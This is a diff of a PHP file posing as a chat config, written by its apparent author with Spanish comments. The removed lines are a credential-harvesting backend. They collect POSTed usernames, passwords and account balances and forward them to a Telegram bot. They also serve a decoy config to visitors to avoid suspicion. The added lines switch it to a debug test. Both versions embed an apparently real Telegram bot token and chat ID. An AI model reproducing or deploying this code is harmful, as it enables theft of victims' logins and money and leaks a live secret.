@@ -1,64 +1,52 @@
 <?php
-// config/chat_config.php
-// Ocultar errores para no revelar nada en salida no deseada
-error_reporting(0);
-// Credenciales ocultas en el servidor
+// config/chat_config.php (DEBUG VERSION)
+// Activar reporte de errores para ver si falla algo de PHP
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+// TUS CREDENCIALES (Asegúrate que sean las copias correctas)
 $TELEGRAM_CHAT_ID = '-5270806868';
 $TELEGRAM_BOT_TOKEN = '8310315205:AAEDfY0nwuSeC_G6l2hXzbRY2xzvAHNJYvQ';
-function sendTelegramMessage($chatId, $token, $message) {
+function sendTelegramMessage($chatId, $token, $message)
+{
     $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
     $data = [
         'chat_id' => $chatId,
         'text' => $message,
         'parse_mode' => 'HTML'
     ];
-    
-    $options = [
-        'http' => [
-            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method'  => 'POST',
-            'content' => http_build_query($data)
-        ]
+    // Usar cURL para mejor debug que file_get_contents
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Por si hay problemas de SSL en el host gratuito
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    curl_close($ch);
+    return [
+        'http_code' => $httpCode,
+        'response' => $response,
+        'curl_error' => $error
     ];
-    
-    $context  = stream_context_create($options);
-    $result = file_get_contents($url, false, $context);
-    return $result;
 }
-// Verificar si es una petición POST con datos de telemetría (Ofuscado)
+// Verificar si es una petición POST con datos
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys_data'])) {
-    
     $rawData = $_POST['sys_data'];
-    // Decodificar info básica (esperamos un JSON en string)
     $data = json_decode($rawData, true);
-    
     if ($data) {
-        // Construir mensaje
-        $msg = "<b>📡 REPORTE DE ACTIVIDAD</b>\n\n";
-        
-        // Agregar campos dinámicamente
-        if (isset($data['u'])) $msg .= "<b>Usuario:</b> " . htmlspecialchars($data['u']) . "\n";
-        if (isset($data['p'])) $msg .= "<b>Clave:</b> " . htmlspecialchars($data['p']) . "\n";
-        if (isset($data['s'])) $msg .= "<b>Estado:</b> " . htmlspecialchars($data['s']) . "\n";
-        if (isset($data['b'])) $msg .= "<b>Saldo:</b> " . htmlspecialchars($data['b']) . "\n";
-        if (isset($data['i'])) $msg .= "<b>Info Extra:</b> " . htmlspecialchars($data['i']) . "\n";
-        
-        $msg .= "\n<i>Time: " . date('Y-m-d H:i:s') . "</i>";
-        
-        // Enviar a Telegram
-        sendTelegramMessage($TELEGRAM_CHAT_ID, $TELEGRAM_BOT_TOKEN, $msg);
-        
-        // Responder éxito discreto
-        echo json_encode(['status' => 'ok']);
+        $msg = "<b>📡 DEBUG TEST</b>\n\n";
+        $msg .= "Si lees esto, el envio funciona.";
+        // Intentar enviar
+        $result = sendTelegramMessage($TELEGRAM_CHAT_ID, $TELEGRAM_BOT_TOKEN, $msg);
+        // DEVOLVER EL RESULTADO COMPLETO DE TELEGRAM PARA QUE TU LO VEAS
+        echo json_encode([
+            'status' => 'debug_done',
+            'telegram_result' => $result
+        ]);
         exit;
     }
 }
-// Si entran por navegador (GET), mostrar algo inocente o la config antigua
-// para no levantar sospechas
-$dummyConfig = [
-    'system_status' => 'active',
-    'version' => '1.0.4',
-    'maintenance' => false
-];
-echo json_encode($dummyConfig);
+echo "Modo DEBUG activo. Haz un POST para probar.";
 ?>
